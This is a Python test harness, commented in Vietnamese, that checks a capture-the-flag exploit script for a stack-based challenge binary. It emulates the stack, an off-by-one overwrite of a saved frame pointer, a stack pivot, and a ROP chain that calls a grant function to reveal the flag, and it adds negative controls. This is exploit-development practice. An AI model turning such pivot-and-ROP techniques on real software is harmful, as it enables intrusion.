"""Kiem chung roi lai cua exploit.py: mo phong stack dung theo dien dich files/chall.

Fake conn gui leak / nhan payload bang dung giao thuc pwntools remote, nen thu
nay kiem chinh ham plan()/payload()/attempt() trong exploit.py (khong copy lai).

Layout voi X = rbp_main (16-byte aligned), theo thu tu prologue/epilogue:
  X-0x20 : saved rbp cua report     (gia tri = X)
  X-0x18 : return address cua report vao main (0x401453)
  X-0x70 : buffer 80 byte cua report -> P, chinh la gia tri in ra trong leak
  X-0x80 : saved rbp cua operator    (gia tri = X-0x20; byte thap bi off-by-one de len)
  X-0xA0 : buffer 32 byte cua operator
Epilogue operator(): leave -> rsp=X-0x80; pop rbp; ret -> ve 0x401407 (binh thuong)
Epilogue report():   leave -> rsp=rbp_bi_hong; pop rbp; ret -> rip = qword [rsp]
"""
import importlib.util
import os
import struct
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "expl", os.path.join(os.path.dirname(HERE), "exploit.py"))
expl = importlib.util.module_from_spec(spec)
spec.loader.exec_module(expl)


class Fake:
    def __init__(self, x):
        self.x = x
        self.mem = {}
        self.result = None

    def put(self, addr, data):
        for i, b in enumerate(data):
            self.mem[addr + i] = b

    def qword(self, addr):
        return struct.unpack(
            "<Q", bytes(self.mem.get(addr + i, 0) for i in range(8)))[0]

    # ---------------- socket gia ----------------
    def recvuntil(self, needle, timeout=None, drop=False):
        if needle == b"allocated at: ":
            return b"=== Sector 01: Maintenance Log Terminal ===\n[*] Report buffer allocated at: "
        if needle == b"\n":
            line = b"0x%x" % (self.x - 0x70)
            return line if drop else line + b"\n"
        raise AssertionError(needle)

    def sendafter(self, needle, data):
        if needle == b"Enter report summary: ":
            assert len(data) == 80, len(data)
            self.put(self.x - 0x70, data)          # read(0, rbp-0x50, 0x50)
        elif needle == b"Tagging operator: ":
            assert len(data) == 33, len(data)
            self.put(self.x - 0xA0, data)          # read(0, rbp-0x20, 0x21)
        else:
            raise AssertionError(needle)

    def recvall(self, timeout=None):
        rbp = self.qword(self.x - 0x80)       # gia tri pop vao rbp khi ket thuc operator()
        # report(): leave -> rsp=rbp ; pop rbp -> rsp=rbp+8 ; ret -> rip=[rbp+8]
        rip = self.qword(rbp + 8)
        rsp = rbp + 16                        # rsp sau khi grant() duoc goi
        tail = b"[*] Processing report...\n"
        if rip == expl.POP_RDI:
            if (self.qword(rsp) == expl.DEAD and self.qword(rsp + 8) == expl.POP_RSI
                    and self.qword(rsp + 16) == expl.CAFE
                    and self.qword(rsp + 24) == expl.GRANT):
                self.result = "FLAG"
                return tail + b"[+] Access Granted! Here is your flag:\nCSSCTF{selftest_ok}\n"
            self.result = "token mismatch"
            return tail + b"[-] Authentication token mismatch.\n"
        if rip == 0:
            self.result = "crash (rip=0)"
            return tail
        self.result = "rip=%#x" % rip
        return tail + b"[*] Log finalized. Exiting.\n"


def check(x):
    # saved rbp cua report va operator phai duoc khoi tao nhu that
    f = Fake(x)
    f.put(x - 0x20, struct.pack("<Q", x))
    f.put(x - 0x80, struct.pack("<Q", x - 0x20))
    flag = expl.attempt(f)
    return f, flag


def main():
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    ok = skip = fail = 0
    for r in range(0, 256, 16):
        x = 0x7FFFD0001000 + r
        f, flag = check(x)
        if f.result == "FLAG":
            assert flag == "CSSCTF{selftest_ok}", flag
            ok += 1
            continue
        L = (x - 0x20) & 0xFF
        if flag is None and f.result is None:
            skip += 1
            assert L < 56, "plan() bo qua trong khi L=%d van cham duoc" % L
            continue
        fail += 1
        print("[FAIL] X mod 256 = %#02x (L=%d) -> %r" % (r, L, f.result))
    print("[*] thanh cong=%d  plan_bo_qua=%d  that_bai=%d" % (ok, skip, fail))

    # negative control: khong co chuoi ROP thi khong duoc ra co
    x = 0x7FFFD0001000 + 128
    f = Fake(x)
    f.put(x - 0x20, struct.pack("<Q", x))
    f.put(x - 0x80, struct.pack("<Q", x - 0x20))
    orig = expl.chain
    expl.chain = lambda: b"A" * 40
    try:
        flag = expl.attempt(f)
    finally:
        expl.chain = orig
    print("[*] control (khong ROP): result=%r flag=%r" % (f.result, flag))
    assert flag is None and f.result != "FLAG", "negative control phai that bai"

    # positive control 2: z lech 1 thi khong duoc ra co
    x2 = 0x7FFFD0001000 + 128
    off, z, a = expl.plan(x2 - 0x70)
    f = Fake(x2)
    f.put(x2 - 0x20, struct.pack("<Q", x2))
    f.put(x2 - 0x80, struct.pack("<Q", x2 - 0x20))
    f.put(x2 - 0x70, expl.payload(off))
    f.put(x2 - 0xA0, b"Z" * 32 + bytes([(z + 1) & 0xFF]))
    f.recvall()
    print("[*] control (z lech 1): result=%r" % f.result)
    assert f.result != "FLAG", "z sai ma van ra co thi harness bi hong"
    print("[+] selftest OK" if fail == 0 else "[!] CO CASE FAIL")
    return 1 if fail else 0


if __name__ == "__main__":
    sys.exit(main())
